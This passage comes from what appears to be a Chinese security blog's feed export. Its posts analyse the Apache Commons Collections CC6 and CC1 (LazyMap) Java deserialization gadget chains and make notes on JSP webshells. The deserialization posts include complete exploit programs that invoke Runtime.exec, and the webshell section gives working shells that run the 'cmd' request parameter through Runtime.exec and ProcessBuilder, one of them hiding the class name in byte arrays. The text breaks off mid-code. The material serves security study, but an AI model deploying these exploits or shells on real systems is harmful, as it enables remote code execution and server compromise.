class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Gets a hashCode compatible with the equals method.</span><br><span class="hljs-comment"> * &lt;p&gt;</span><br><span class="hljs-comment"> * Implemented per API documentation of {<span class="hljs-doctag">@link</span> java.util.Map.Entry#hashCode()}</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> a suitable hash code</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> {<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>}<br></code></pre></td></tr></table></figure><p>然后使用了<code>HashMap</code>的<code>hash</code>方法去触发，可以发现是<code>key.hashCode()</code>，说明我们的payload应该作为<code>key</code>，我们<strong>目前构造了<code>TiedMapEntry</code>实例，那么我们下一步就是将其作为<code>key</code>去新构造一个<code>hashMap</code>实例。</strong>然后<code>put</code>方法对<code>hash</code>进行了调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> {<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>}<br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> {<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>}<br></code></pre></td></tr></table></figure><p>最后顶层是<code>HashSet</code>的<code>readObject</code>作为入口，反序列化漏洞大都存在于某个类的<code>readObject</code>中，分析到目前我有一个感受就是，更像是两边向中间衍生，然后刚好链接在一起就出现了漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Read in all elements in the proper order.</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) {<br>    <span class="hljs-meta">@SuppressWarnings("unchecked")</span><br>        <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (E) s.readObject();<br>    map.put(e, PRESENT);<span class="hljs-comment">//trigger!</span><br>}<br></code></pre></td></tr></table></figure><p>分析到这里可以写出Exp的内容了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {<br>        Transformer[] fakeFormer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)};<br>        <span class="hljs-comment">// 第一层</span><br>        Transformer[] tfs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)<br>        };<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeFormer);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(),transformerChain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">"key"</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">tiedMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        tiedMap.put(tiedMapEntry,<span class="hljs-string">"Exp"</span>);<br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashSet.add(tiedMap);<br>        lazyMap.remove(<span class="hljs-string">"key"</span>);<br><span class="hljs-comment">//        反射修改变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">"iTransformers"</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, tfs);<br><br>        <span class="hljs-comment">// 测试</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(hashSet);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        ois.readObject();<br>    }<br>}<br></code></pre></td></tr></table></figure><p>这其中有个非常关键的代码<code>lazyMap.remove("key");</code>， 为什么要移除，看到<code>LazyMap.get()</code>的代码：</p><p><strong>存在一个是否含有键值的判断，而我们的key在构造<code>TiedMapEntry</code>的时候就被固定下来了，除非你用反射去修改，但是没有必要，直接在<code>lazyMap</code>中把<code>key</code>的键值对给去除就行</strong>。</p><img src="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914220207010.png" class="" title="image-20240914220207010"><p>最后捋一捋，</p><p><code>LazyMap</code>作为CC6的一个转折点，往下已经分析过多次。</p><p>往上走，使用<code>LazyMap</code>构造了一个<code>TiedMapEntry</code>实例，目的是为了使用<code>LazyMap.get()</code></p><p>再用<code>TiedMapEntry</code>作为了一个新的<code>HashMap</code>的<code>key</code>值，目的是为了触发<code>key.hashCode()</code></p><p>最后用<code>HashSet</code>包裹，目的是为了使用其<code>readObject</code>方法来触发<code>map.put()</code>，从而进入<code>hash(key)-&gt;key.hashCode()</code></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1链lazyMap</title>
    <link href="/2024/08/13/CC1%E9%93%BElazyMap/"/>
    <url>/2024/08/13/CC1%E9%93%BElazyMap/</url>
    
    <content type="html"><![CDATA[<p>之前分析了<code>TransformMap</code>那条链，现在分析一下<code>LazyMap</code></p><span id="more"></span><p><code>LazyMap</code>这条链子是<code>ysoserial</code>在使用，其同样在<code>org.apache.commons.collections.map</code>路径下，我在其源码中可以看到，在<code>get</code>方法中调用了<code>transform()</code>这个函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> {<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) {<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    }<br>    <span class="hljs-keyword">return</span> map.get(key);<br>}<br></code></pre></td></tr></table></figure><p>现在我们找到了最底层的出发点，现在向上查看对<code>LayMap.get()</code>的调用，可以发现有一大堆，直接看看<code>ysoserial</code>里面是怎么设计的，还是使用了<code>AnnotationInvocationHandler</code>这个类，但是并不是在它的<code>readObject</code>函数中了，搜索一下<code>get</code>，在77行的位置，<code>invoke</code>函数中调用了Map类的<code>get</code>函数，而<code>LazyMap</code>显然是继承<code>Map</code>类的。</p><p>下一个问题是，如何使用<code>AnnotationInvocationHandler</code>的<code>invoke</code>函数，从这个类的注释中可以发现，它是对注解调用处理的动态代理实现。关于动态代理可以看看JavaSec的这篇文章，<a href="https://www.javasec.org/javase/DynamicProxy/DynamicProxy.html">Java动态代理</a></p><p>在<code>ysoserial</code>中也是使用了动态代理的方法进行的构造，创建动态代理类会使用到<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口。<code>java.lang.reflect.Proxy</code>主要用于生成动态代理类<code>Class</code>、创建代理类实例。</p><p>创建动态代理实例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br><span class="hljs-title class_">Class</span>[] {Map.class}, handler);<br></code></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code>的第一个参数是<code>ClassLoader</code>，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了<code>InvocationHandler</code>接口的对象，里面包含了具体代理的逻辑。<strong>被代理的接口类通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果</strong>。</p><p>根据构造的需要，要触发<code>AnnotationInvocationHandler</code>的<code>invoke</code>，对其进行动态代理，再调用任意函数就可以了，调用函数简单，反序列化自动会调用<code>Map</code>的一些函数。</p><p>所以根据<code>TransformMap</code>的链子我们可以写出<code>lazyMap</code>的链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-comment">// 第一层</span><br>        Transformer[] tfs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>        };<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(tfs);<br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">"value"</span>, <span class="hljs-string">"3xsh0re"</span>);<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,transformerChain);<br><span class="hljs-comment">//        获取类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        对Map创建代理,使用AnnotationInvocationHandler进行代理</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] {Map.class}, handler);<br><span class="hljs-comment">//        对proxyMap进行再封装,因为我们需要的是AnnotationInvocationHandler的readObject</span><br>        handler = (InvocationHandler) constructor.newInstance(Target.class,proxyMap);<br><br><span class="hljs-comment">//        测试</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    }<br>}<br></code></pre></td></tr></table></figure><p>我自己的payload在调试过程中会弹出很多次计算器，因为被代理后，只要使用<code>Map</code>相关的函数就会到<code>invoke</code>。调试器会调用一些toString之类的方法，导致不经意间触发了 命令。<code>ysoserial</code>对此有一些处理，它在POC的最后才将执行命令的<code>Transformer</code>数组设置到<code>transformerChain</code>中，原因是避免本地生成序列化流的程序执行到命令。可以发现<code>ysoserial</code>实现了一个工具类去处理这种情况。</p><img src="/2024/08/13/CC1%E9%93%BElazyMap/image-20240913202953660.png" class="" title="image-20240913202953660"><p>最后来捋一捋这个逻辑：</p><p><code>AnnotationInvocationHandler</code>封装<code>proxyMap</code>从而可以被序列化</p><p><code>AnnotationInvocationHandler</code>代理<code>Map.class</code>从而可以触发<code>invoke</code>函数</p><p>构造的<code>AnnotationInvocationHandler</code>实例中，<code>lazyMap</code>作为成员变量被传入，在<code>invoke</code>函数中调用<code>get</code>函数</p><p>在<code>lazyMap.get()</code>中调用<code>transform</code></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSPWebShell小记</title>
    <link href="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/"/>
    <url>/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>学习JavaSec中有这一部分，故系统记录一下。</p><span id="more"></span><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先，IDEA肯定是准备好，这个不细说了，破解版各个公众号都有。</p><p>然后下载Tomcat作为Web服务，因为JSP是动态页面，必须要有容器，我自己在官网下的Tomcat9，这里给一个7版本的下载地址。</p><p><a href="https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.82/bin/apache-tomcat-7.0.82.zip">Tomcat-7.0.82</a></p><p>解压缩后记住地址，新建一个IDEA的项目，具体配置见这篇文章：<a href="https://www.2it.club/code/java/10637.html">在IDEA中搭建JSP环境</a></p><p>写好了一个JSP🐎的时候发现会报错无法解决函数的问题，是因为没有导入相关的jar包。</p><p><code>ctrl+shift+alt+s</code>打开项目配置，找到<code>lib</code>，添加Tomcat的相关依赖。<a href="https://commons.apache.org/">common包官网</a></p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240909160958795.png" class="" title="image-20240909160958795"><p>当运行Tomcat的时候，控制台中文出现了乱码，解决方案：<code>ctrl+alt+s</code>打开系统设置，进入控制台选项，修改编码为UTF-8</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240909161912300.png" class="" title="image-20240909161912300"><p>最后就可以正常运行了</p><h3 id="JSPWebShell基础"><a href="#JSPWebShell基础" class="headerlink" title="JSPWebShell基础"></a>JSPWebShell基础</h3><p>JSP 语法其实非常简单，我们只需要将 Java 语句使用 <code>&lt;%JavaCode%&gt;</code> 进行包裹。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%<br>    out.println(<span class="hljs-string">"test"</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p>本质上还是在写Java代码，这里给出一个最基础的🐎：利用<code>Runtime</code>类的<code>exec</code>执行系统命令。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.ByteArrayOutputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.InputStream"</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">"cmd"</span>)).getInputStream();<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) {<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    }<br>    out.write(<span class="hljs-string">"&lt;pre&gt;"</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(baos.toByteArray()) + <span class="hljs-string">"&lt;/pre&gt;"</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p><code>exec</code>方法并不是命令执行的最终点，执行逻辑大致是：</p><ul><li><code>Runtime.exec("whoami")</code></li><li><code>java.lang.ProcessBuilder.start()</code></li><li><code>new java.lang.UNIXProcess("whoami")</code></li><li><code>UNIXProcess</code>构造方法中调用了<code>forkAndExec("whoami")</code>native方法。</li><li><code>forkAndExec</code>调用操作系统级别<code>fork-&gt;exec(*nix)/CreateProcess(Windows)</code>执行命令并返回<code>fork/CreateProcess</code>的<code>PID</code>。</li></ul><h3 id="ProcessBuilder命令执行"><a href="#ProcessBuilder命令执行" class="headerlink" title="ProcessBuilder命令执行"></a>ProcessBuilder命令执行</h3><p>学习<code>Runtime</code>命令执行的时候，其最终<code>exec</code>方法会调用<code>ProcessBuilder</code>来执行本地命令，那么我们只需跟踪下Runtime的exec方法就可以知道如何使用<code>ProcessBuilder</code>来执行系统命令了。</p><p><strong>process_builder.jsp命令执行测试</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.ByteArrayOutputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.InputStream"</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(request.getParameterValues(<span class="hljs-string">"cmd"</span>)).start().getInputStream();<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) {<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    }<br><br>    out.write(<span class="hljs-string">"&lt;pre&gt;"</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(baos.toByteArray()) + <span class="hljs-string">"&lt;/pre&gt;"</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="利用反射执行系统命令"><a href="#利用反射执行系统命令" class="headerlink" title="利用反射执行系统命令"></a>利用反射执行系统命令</h3><p>既然是Java代码，当然是可以直接使用反射来执行<code>Runtime</code>类的函数的。 </p><p>这里我通过字节转成字符串来反射获取类和函数，并且这里我没有去实例化<code>Runtime</code>类，直接获取<code>getRuntime</code>这个函数来达到实例化的目的</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240909174827185.png" class="" title="image-20240909174827185"><p>通过连续两次执行<code>invoke()</code>最终得到执行结果。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.ByteArrayOutputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.InputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Method"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Constructor"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.util.Scanner"</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"cmd"</span>);<br>    <span class="hljs-comment">// 定义"java.lang.Runtime"字符串变量</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>});<br>    <span class="hljs-comment">// 反射java.lang.Runtime类获取Class对象</span><br>    Class&lt;?&gt; c = Class.forName(rt);<br>    <span class="hljs-comment">// 反射获取Runtime类的getRuntime方法</span><br>    <span class="hljs-type">Method</span> <span 